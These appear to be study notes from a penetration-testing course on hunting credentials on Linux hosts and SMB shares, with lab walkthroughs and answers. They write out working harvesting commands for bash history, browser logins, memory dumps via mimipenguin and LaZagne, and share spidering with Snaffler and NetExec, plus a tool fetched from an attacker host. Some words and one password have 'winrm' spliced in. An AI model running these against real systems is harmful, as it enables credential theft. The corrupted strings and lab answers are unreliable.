$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
Tìm các file (regular files) trong /home/* mà có đuôi .txt hoặc không có dấu chấm trong tên (tức file không có “extension”).

\\Searching for scripts
Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automaticall
$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

\\Enumerating cronjobs
Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (/etc/crontab) and user-dependent executions
applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, /etc/cron.weekly). The scripts and files used by cron can also be found in /etc/cron.d/ for Debian-based distributions.
$cat /etc/crontab
$ ls -la /etc/cron.*/

\\Enumerating history files
In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in .bash_history. 
Nevertheless, other files like .bashrc or .bash_profile can contain important information.
$tail -n5 /home/*/.bash*

\\Enumerating log files
Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background
Application logs
Event logs
Service logs
System logs
File	Description
/var/log/messages	Generic system activity logs.
/var/log/syslog	Generic system activity logs.
/var/log/auth.log	(Debian) All authentication related logs.
/var/log/secure	(RedHat/CentOS) All authentication related logs.
/var/log/boot.log	Booting information.
/var/log/dmesg	Hardware and drivers related information and logs.
/var/log/kern.log	Kernel related warnings, errors and logs.
/var/log/faillog	Failed login attempts.
/var/log/cron	Information related to cron jobs.
/var/log/mail.log	All mail server related logs.
/var/log/httpd	All Apache related logs.
/var/log/mysqld.log	All MySQL server related logs.
Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats
$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

\\Memory and cache
Mimipenguin
Many applications and processes work with credentiwinrmals needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users.
 Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called mimipenguin that makes the whole process easier. However, this tool requires administrator/root permissions.
 $sudo python3 minipenguin.py
[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY

\\LaZagne
An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is LaZagne. This tool allows us to access far more resources and extract the credentials
 Keyrings are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.
$ sudo python2.7 laZagne.py all

\\Browser credentials
they are encrypted and stored in logins.json on the system. 
$ ls -l .mozilla/firefox/ | grep default 
$cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
https://github.com/unode/firefox_decrypt
$ python3.9 firefox_decrypt.py
Alternatively, LaZagne can also return results if the user has used the supported browser.
$ python3 laZagne.py browsers

<test>Examine the target and find out the password of the user Will. Then, submit the password as the answer.
$ ssh kira@10.129.143.236
ls -la >.mozilla
wget -q https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
python3 -m http.server
wget PWNIP:8000/firefox_decrypt.py
.mozilla/firefox/ytb95ytb.default-release$ python3.9 firefox_decrypt.py 

\\Credential Hunting in Network Traffic
However, not all environments are fully secured. Legacy systems, misconfigured services, or test applications launched without HTTPS can still result in the use of unencrypted protocols such as HTTP or SNMP
These gaps present a valuable opportunity for attackers: the chance to hunt for credentials in cleartext network traffic
Unencrypted Protocol	Encrypted Counterpart	Description
HTTP	HTTPS	Used for transferring web pages and resources over the internet.
FTP	FTPS/SFTP	Used for transferring files between a client and a server.
SNMP	SNMPv3 (with encryption)	Used for monitoring and managing network devices like routers and switches.
POP3	POP3S	Retrieves emails from a mail server to a local client.
IMAP	IMAPS	Accesses and manages email messages directly on the mail server.
SMTP	SMTPS	Sends email messages from client to server or between mail servers.
LDAP	LDAPS	Queries and modifies directory services like user credentials and roles.
RDP	RDP (with TLS)	Provides remote desktop access to Windows systems.
DNS (Traditional)	DNS over HTTPS (DoH)	Resolves domain names into IP addresses.
SMB	SMB over TLS (SMB 3.0)	Shares files, printers, and other resources over a network.
VNC	VNC with TLS/SSL	Allows graphical remote control of another computer.

\\Wireshark
Wireshark is a well-known packet analyzer that comes pre-installed in nearly all penetration testing Linux distributions. It features a powerful filter engine that allows for efficient searching through both live and captured network traffic. Some basic but useful filters include:
Wireshark filter	Description
ip.addr == 56.48.210.13	Filters packets with a specific IP address
tcp.port == 80	Filters packets by port (HTTP in this case).
http	Filters for HTTP traffic.
dns	Filters DNS traffic, which is useful to monitor domain name resolution.
tcp.flags.syn == 1 && tcp.flags.ack == 0	Filters SYN packets (used in TCP handshakes), useful for detecting scanning or connection attempts.
icmp	Filters ICMP packets (used for Ping), which can be useful for reconnaissance or network issues.
http.request.method == "POST"	Filters for HTTP POST requests. In the case that POST requests are sent over unencrypted HTTP, it may be the case that passwords or other sensitive information is contained within.
tcp.stream eq 53	Filters for a specific TCP stream. Helps track a conversation between two hosts.
eth.addr == 00:11:22:33:44:55	Filters packets from/to a specific MAC address.
ip.src == 192.168.24.3 && ip.dst == 56.48.210.3	Filters traffic between two specific IP addresses. Helps track communication between specific hosts.
One way to do this is by using a display filter such as http contains "passw". Alternatively, you can navigate to Edit > Find Packet and enter the desired search query manuall

\\Pcredz
Pcredz is a tool that can be used to extract credewinrmntials from live traffic or network packet captures. Specifically, it supports extracting the following information:

Credit card numbers
POP credentials
SMTP credentials
IMAP credentials
SNMP community strings
FTP credentials
Credentials from HTTP NTLM/Basic headers, as well as HTTP Forms
NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP
Kerberos (AS-REQ Pre-Auth etype 23) hashes

$ ./Pcredz -f demo.pcapng -t -v

\\\\\\\\\\\\\\\\\\\\====================================
Credential Hunting in Network Shares
explore how to hunt for credentials across network shares from both Windows and Linux systems using common tools, along with general techniques attackers use to uncover hidden secrets.

\\Common credential patterns
Look for keywords within files such as passw, user, token, key, and secret.
Search for files with extensions commonly associated with stored credentials, such as .ini, .cfg, .env, .xlsx, .ps1, and .bat.
Watch for files with "interesting" names that include terms like config, user, passw, cred, or initial.
If you're trying to locate credentials within the INLANEFREIGHT.LOCAL domain, it may be helpful to search for files containing the string INLANEFREIGHT\.
Keywords should be localized based on the target; if you are attacking a German company, it's more likely they will reference a "Benutzer" than a "User".
Pay attention to the shares you are looking at, and be strategic. If you scan ten shares with thousands of files each, it's going to take a signifcant amount of time. Shares used by IT employees might be a more valuable target than those used for company photos.

-With all of this in mind, you may want to begin with basic command-line searches (e.g., Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern ...) before scaling up to more advanced tools. Let's take a look at how we can use MANSPIDER, Snaffler, SnafflePy, and NetExec to automate and enhance this credential hunting process.

\\Hunting from Windows
\\Snaffler
https://github.com/SnaffCon/Snaffler
 This is a C# program that, when run on a domain-joined machine, automatically identifies accessible network shares and searches for interesting file
C:\Users\Public>Snaffler.exe -S
ll of the tools covered in this section output a large amount of information. While they assist with automation, a fair amount of manual review is typically required, as many matches may turn out to be "false positives". Two useful parameters that can help refine Snaffler's search process are:
-u retrieves a list of users from Active Directory and searches for references to them in files
-i and -n allow you to specify which shares should be included in the search

\\PowerHuntShares
Another tool that can be used is PowerHuntShares, a PowerShell script that doesn't necessarily need to be run on a domain-joined machine. One of its most useful features is that it generates an HTML report upon completion, providing an easy-to-use UI for reviewing the results:
We can run a basic scan using PowerHuntShares like so:
https://github.com/NetSPI/PowerHuntShares
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

\\Hunting from Linux
\\MANSPIDER
Use MANSPIDER’s official Docker container to scan SMB shares from Linux (no domain access needed) and tune its parameters to search for strings like passw.
$docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'

\\NetExec
In addition to its many other uses, NetExec can also be used to search through network shares using the --spider option. This functionality is described in great detail on the official wiki. A basic scan of network shares for files containing the string "passw" can be run like so:
$nxc smb 10.129.234.121 -u mendres -p 'Inlanefreigwinrmht2025!' --spider IT --content --pattern "passw"

<test>
Use the credentials mendres:Inlanefreight2025! to connect to the target either by RDP
 or WinRM, then use the tools and techniques taught in this section to answer the questions below. 
 For your convenience, Snaffler and PowerHuntShares can be found in C:\Users\Public.
C:\Users\Public>Snaffler.exe -S 
S C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

<test>One of the shares mendres has access to contains valid credentials of another domain user. What is their password?
$nxc smb STMIP -u mendres -p 'Inlanefreight2025!' --shares
xfreerdp /v:10.129.232.180 /u:mendres /p:Inlanefreight2025!
Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"
jbader:ILovePower333###
<test>As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?
$nxc smb smtip -u jbader -p 'IlovePower333###' --spider HR --content --pattern "Administrator"
$smbclient //10.129.232.180/HR -U jbader
cat On,....